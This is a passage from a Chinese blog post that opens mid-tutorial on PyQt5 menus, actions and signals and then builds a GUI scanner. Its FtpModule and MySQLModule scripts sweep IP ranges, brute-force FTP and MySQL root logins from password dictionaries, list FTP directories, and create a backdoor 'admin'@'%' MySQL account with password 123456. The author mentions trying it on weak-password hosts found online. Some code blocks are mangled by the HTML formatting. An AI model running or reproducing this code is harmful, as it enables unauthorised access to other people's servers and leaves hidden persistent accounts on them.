fileMenu.addAction(exitAction)</code></pre><p><code>QAction</code> 是一个用于菜单栏、工具栏或自定义快捷键的抽象动作行为。在上面的三行中，我们创建了一个有指定图标和文本为 <code>&#39;Exit&#39;</code> 的标签。另外，还为这个动作定义了一个快捷键。第三行创建一个当我们鼠标浮于菜单项之上就会显示的一个状态提示。当我们选中特定的动作，一个触发信号会被发射。信号连接到 <code>QApplication</code> 组件的<code>quit()</code> 方法。这样就中断了应用。</p>
<pre><code>exitAction = QAction(QIcon(&quot;C:/Users/brian/Documents/GitHub/Hexo-Blog/themes/hexo-theme-aircloud/source/img/favicon.ico&quot;)
                                 , &apos;&amp;Exit&apos;, self)
            exitAction.setShortcut(&apos;Ctrl+Q&apos;)
            exitAction.setStatusTip(&apos;Exit application&apos;)
            exitAction.triggered.connect(self.close)</code></pre><p>我们创建了一个动作对象，和之前菜单栏中的部分代码相似。这个动作有一个标签，图标和快捷键。并且将<code>QtGui.QMainWindow的quit()</code> 方法连接到了触发信号上。创建了一个工具栏，并且在其中插入一个动作对象。</p>
<h3 id="事件和信号"><a href="#事件和信号" class="headerlink" title="事件和信号"></a>事件和信号</h3><p>所有的GUI应用都是由事件驱动的。事件主要有用户操作产生，但是事件可能由其他条件触发，比如一个网络连接。当我们调用应用的 exec_() 方法时，应用进入了主循环，主循环用于检测事件的产生并且将事件送到用于处理的对象中去。</p>
<p>事件模型有三个参与者：</p>
<ul>
<li>事件源</li>
<li>事件对象</li>
<li>事件目标</li>
</ul>
<p>事件源是状态发生改变的对象。它产生了事件。事件对象(evnet)封装了事件源中的状态变化。事件目标是想要被通知的对象。事件源对象代表了处理一个事件直到事件目标做出响应的任务。</p>
<p>PyQt5有一个独一无二的信号和槽机制来处理事件。信号和槽用于对象之间的通信。当指定事件发生，一个事件信号会被发射。槽可以被任何Python脚本调用。当和槽连接的信号被发射时，槽会被调用。</p>
<p>由于 Qt desinger 的设计与逻辑分离会给我们很大的帮助，所以我们使用 Qt desinger 来设计一个模板</p>
<p><strong>sample_scan_1.py</strong></p>
<pre><code>from PyQt5 import QtCore, QtGui, QtWidgets</code></pre><p>​<br>    class Ui_Form(object):<br>        def setupUi(self, Form):<br>            Form.setObjectName(“Form”)<br>            Form.resize(439, 345)<br>            self.verticalLayoutWidget = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget.setGeometry(QtCore.QRect(10, 50, 131, 80))<br>            self.verticalLayoutWidget.setObjectName(“verticalLayoutWidget”)<br>            self.verticalLayout = QtWidgets.QVBoxLayout(self.verticalLayoutWidget)<br>            self.verticalLayout.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout.setObjectName(“verticalLayout”)<br>            self.ftp_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.ftp_label.setObjectName(“ftp_label”)<br>            self.verticalLayout.addWidget(self.ftp_label)<br>            self.mysql_label = QtWidgets.QLabel(self.verticalLayoutWidget)<br>            self.mysql_label.setObjectName(“mysql_label”)<br>            self.verticalLayout.addWidget(self.mysql_label)<br>            self.verticalLayoutWidget_2 = QtWidgets.QWidget(Form)<br>            self.verticalLayoutWidget_2.setGeometry(QtCore.QRect(160, 50, 160, 80))<br>            self.verticalLayoutWidget_2.setObjectName(“verticalLayoutWidget_2”)<br>            self.verticalLayout_2 = QtWidgets.QVBoxLayout(self.verticalLayoutWidget_2)<br>            self.verticalLayout_2.setContentsMargins(0, 0, 0, 0)<br>            self.verticalLayout_2.setObjectName(“verticalLayout_2”)<br>            self.ftp_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.ftp_scan.setObjectName(“ftp_scan”)<br>            self.verticalLayout_2.addWidget(self.ftp_scan)<br>            self.mysql_scan = QtWidgets.QPushButton(self.verticalLayoutWidget_2)<br>            self.mysql_scan.setObjectName(“mysql_scan”)<br>            self.verticalLayout_2.addWidget(self.mysql_scan)<br>            self.textBrowser = QtWidgets.QTextBrowser(Form)<br>            self.textBrowser.setGeometry(QtCore.QRect(40, 140, 256, 192))<br>            self.textBrowser.setObjectName(“textBrowser”)</p>
<pre><code>        self.retranslateUi(Form)
        QtCore.QMetaObject.connectSlotsByName(Form)

    def retranslateUi(self, Form):
        _translate = QtCore.QCoreApplication.translate
        Form.setWindowTitle(_translate(&quot;Form&quot;, &quot;Form&quot;))
        self.ftp_label.setText(_translate(&quot;Form&quot;, &quot;FTP server&quot;))
        self.mysql_label.setText(_translate(&quot;Form&quot;, &quot;MySQL server&quot;))
        self.ftp_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))
        self.mysql_scan.setText(_translate(&quot;Form&quot;, &quot;开始扫描&quot;))
        self.textBrowser.setHtml(_translate(&quot;Form&quot;, &quot;&lt;!DOCTYPE HTML PUBLIC \&quot;-//W3C//DTD HTML 4.0//EN\&quot; \&quot;http://www.w3.org/TR/REC-html40/strict.dtd\&quot;&gt;\n&quot;
&quot;&lt;html&gt;&lt;head&gt;&lt;meta name=\&quot;qrichtext\&quot; content=\&quot;1\&quot; /&gt;&lt;style type=\&quot;text/css\&quot;&gt;\n&quot;
&quot;p, li { white-space: pre-wrap; }\n&quot;
&quot;&lt;/style&gt;&lt;/head&gt;&lt;body style=\&quot; font-family:\&apos;SimSun\&apos;; font-size:9pt; font-weight:400; font-style:normal;\&quot;&gt;\n&quot;
&quot;&lt;p style=\&quot; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\&quot;&gt;&lt;span style=\&quot; font-family:\&apos;SimSun\&apos;;\&quot;&gt;扫描结果如下：&lt;/span&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;))</code></pre><p>然后我们只需写一个调用这个组件的代码就行：</p>
<p><strong>call_scan1.py</strong></p>
<pre><code>import sys
import time
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5.QtCore import QObject, pyqtSignal

from sample_scan_1 import Ui_Form
from FtpModule import Ftp
from MySQLModule import MySQL</code></pre><p>​<br>    class MainWindow(QMainWindow, Ui_Form):<br>        def <strong>init</strong>(self, parent=None):<br>            super(MainWindow, self).<strong>init</strong>(parent)<br>            self.setupUi(self)<br>            self.ftp_scan.clicked.connect(lambda: self.ftp())<br>            self.mysql_scan.clicked.connect(lambda: self.mysql())<br>            self.update_text()</p>
<pre><code>    def ftp(self):
        ftp = Ftp()
        ftp.threadpool()

    def mysql(self):
        mysql = MySQL()
        mysql.threadpool()

    def update_text(self):

        with open(&quot;./result.txt&quot;) as f:
            line = f.readlines()
            self.textBrowser.append(line[-1])

if __name__ == &quot;__main__&quot;:
    # 固定的，PyQt5程序都需要QApplication对象。sys.argv是命令行参数列表，确保程序可以双击运行
    app = QApplication(sys.argv)
    # 初始化
    myWin = MainWindow()
    # 将窗口控件显示在屏幕上
    myWin.show()
    # 程序运行，sys.exit方法确保程序完整退出。
    sys.exit(app.exec_())</code></pre><h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>为了更好的与 PyQt5 配合，将代码各个功能规划到不同的类，根据需求调用</p>
<p><strong>FtpModule.py</strong></p>
<pre><code>import time
import socket
from ftplib import FTP
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool</code></pre><p>​<br>    class Ftp(object):</p>
<pre><code>def __init__(self):
    self.save_path = &quot;./result.txt&quot;
    self.ip_list = []

def port_scan(self, ip):
    t1 = datetime.now()
    print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\n&quot;)
    # scan_port(line.strip())
    # 测试ftp端口是否开放
    sk1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk1.settimeout(1)
    url2 = ip
    # try_login_ftp(url2, save_path)
    try:
        res1 = sk1.connect_ex((ip, 21))
        # print(res1)
        if res1 == 0:
            print(&quot;\n[+] &quot; + str(url2) + &quot;\&apos;s ftp service is ok! try to login...\r\n&quot;)
            self.try_login_ftp(url2)

    except Exception as e:
        print(&quot;\n[+] &quot; + str(url2) + &quot;\&apos;s ftp service login failed!&quot; + e + &quot;\r\n&quot;)
    sk1.close()
    print(datetime.now() - t1)
    return

def try_login_ftp(self, ip):
    # 如果输出 user 和 pwd 为空则说明该 ftp 服务允许匿名访问
    try:
        ftp = FTP()
        ftp.connect(ip)
        with open(&quot;ftp_dict.txt&quot;, &apos;r&apos;) as f:
            for line in f.readlines():
                # print line.strip()
                user = line.strip().split(&quot;|&quot;)[0]
                pwd = line.strip().split(&quot;|&quot;)[1]
                ftp.login(user, pwd)  # 匿名访问
                # 访问成功
                print(
                    &quot;[+] &quot; + str(ip) + &quot;s FTP service login successful！username= &quot; +
                    user + &quot;pwd = &quot; + pwd + &quot;\r\n&quot;)
                # 将结果写入文件 result.txt
                avleable_list = &quot;\rftp service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + \
                                str(ip) + &quot; username | pwd : &quot; + str(user) + &quot; | &quot; + str(pwd)
                self.save_result(self.save_path, avleable_list)
                # 尝试读取目录
                print(&quot;\n[+] &quot; + str(ip) + &quot;s ftp 文件目录为：&quot;)
                ftp.dir()
                break
    except Exception as e:
        print(e)
        print(&quot;\n[+] &quot; + str(self.ip) + &quot;s ftp service is bad!\r\n&quot;)
        pass
    return

def save_result(self, save_path, result_list):
    s = open(self.save_path, &quot;a&quot;)
    s.write(result_list)
    s.close()
    return

def threadpool(self):
    with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:
        for line in f.readlines():
            self.ip_list.append(line.strip())
    print(self.ip_list)
    t1 = datetime.now()
    # 线程数为20
    pool = ThreadPool(processes=20)
    try:
        pool.map(self.port_scan, self.ip_list)
    except Exception as e:
        print(e)
    pool.close()
    pool.join()

    print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)
    # port_scan(save_path=&quot;./result.txt&quot;)
    return</code></pre><p><strong>MySQLModule.py</strong></p>
<pre><code>import pymysql
import socket
import time
from datetime import datetime
from multiprocessing.dummy import Pool as ThreadPool

class MySQL(object):

    def __init__(self):
        self.save_path = &quot;./result.txt&quot;
        self.ip_list = []

    def port_scan(self, ip):
        t1 = datetime.now()
        print(&quot;[+] Testing ports of : &quot; + str(ip) + &quot;\n&quot;)
        # scan_port(line.strip())
        url1 = ip
        # 测试mysql端口是否开放
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            res = sk.connect_ex((ip, 3306))
            if res == 0:
                print(&quot;\n[+] &quot; + str(url1) + &quot;\&apos;s Mysql is ok! try to login...\r\n&quot;)
                self.try_login_sqlserver(url1)

        except Exception as e:
            print(&quot;\n[-] &quot; + str(url1) + &quot;\&apos;s Mysql is bad! &quot; + e + &quot;\r\n&quot;)
        sk.close()
        return

    # 尝试登陆mysql服务
    def try_login_sqlserver(self, ip):

        with open(&apos;dict.txt&apos;, &apos;r&apos;) as f:
            for line in f.readlines():
                print(&quot;[+] Testing ip: &quot; + str(ip) + &quot; &amp; testing password：&quot; + line.strip())

                # information_schema 是 Mysql 的默认数据库，我们有权限操作
                # PyMysql.cursors.DictCursor 以字典方式进行连接参数管理
                try:
                    connection = pymysql.connect(host=ip,
                                                 user=&apos;root&apos;,
                                                 password=line.strip(),
                                                 db=&apos;information_schema&apos;,
                                                 charset=&apos;utf8mb4&apos;,
                                                 cursorclass=pymysql.cursors.DictCursor)

                    print(&quot;\n[+] Testing ip: &quot; + str(ip) + &quot; Login successfully! try to set a backdoor account...\r\n&quot;)
                    result_list = &quot;\nsql service -- &quot; + str(time.asctime()) + &quot; ip: &quot; + str(ip) + &quot; pwd : &quot; + \
                                  str(line.strip())
                    self.save_result(result_list)
                    # 后门账号密码为 admin 123456
                    self.try_set_backdoor(connection)
                    connection.close()
                except Exception as e:
                    # print &quot;[-] &quot; + str(e.message)
                    print(&quot;\n[+] Testing ip: &quot; + str(ip) + &quot;  Using weakly password login failed!...&quot; + str(e) + &quot;\r\n&quot;)
                pass
        return

    def try_set_backdoor(self, connection):
        try:
            with connection.cursor() as cursor:
                # 创建一个新用户
                sql = &quot;CREATE user &apos;admin&apos;@&apos;%&apos; identified by &apos;123456&apos;;&quot;
                cursor.execute(sql)
                # 将后门用户权限给到最大
                cursor.execute(&quot;flush privileges;&quot;)
                connection.commit()
                connection.close()

                print(&quot;[+] New account set successfully!\r\n&quot;)
        except Exception as e:
            # print e
            print(&quot;[-] New account set failed! &quot; + str(e) + &apos;\r\n&apos;)
        return

    def save_result(self, result_list):
        s = open(self.save_path, &quot;a&quot;)
        s.write(result_list)
        s.close()
        return

    def threadpool(self):
        with open(&apos;iprange.txt&apos;, &apos;rb&apos;) as f:
            for line in f.readlines():
                self.ip_list.append(line.strip())
        print(self.ip_list)
        t1 = datetime.now()
        # 线程数为20
        pool = ThreadPool(processes=20)
        try:
            pool.map(self.port_scan, self.ip_list)
        except Exception as e:
            print(e)
        pool.close()
        pool.join()

        print(&apos;Multiprocess Scanning Completed in  &apos;, datetime.now() - t1)
        # port_scan(save_path=&quot;./result.txt&quot;)
        return</code></pre><h3 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h3><p>在网上找到弱口令账号之后，对方并没有开启远程登陆，也没法登陆成功！该怎么解决呢？明天再看看！12/16/2019 5:34:36 PM </p>
<p>答：如果不开启远程登陆，就无法远程连接该数据库，视为未开放弱口令</p>
<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><blockquote>
<p><a href="https://www.cnblogs.com/KevinGeorge/p/7858564.html" target="_blank" rel="noopener">https://www.cnblogs.com/KevinGeorge/p/7858564.html</a></p>
<p><a href="https://nmap.org/man/zh/man-host-discovery.html" target="_blank" rel="noopener">https://nmap.org/man/zh/man-host-discovery.html</a></p>
<p><a href="https://pypi.org/project/pcap-ct/" target="_blank" rel="noopener">https://pypi.org/project/pcap-ct/</a></p>
<p><a href="https://github.com/PyMySQL/PyMySQL/">https://github.com/PyMySQL/PyMySQL/</a></p>
<p><a href="https://blog.csdn.net/rebelqsp/article/details/22109925" target="_blank" rel="noopener">https://blog.csdn.net/rebelqsp/article/details/22109925</a></p>
<p><a href="https://www.jb51.net/article/62238.htm" target="_blank" rel="noopener">https://www.jb51.net/article/62238.htm</a></p>
<p><a href="https://blog.csdn.net/weixin_33805992/article/details/86435703" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33805992/article/details/86435703</a></p>
</blockquote>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
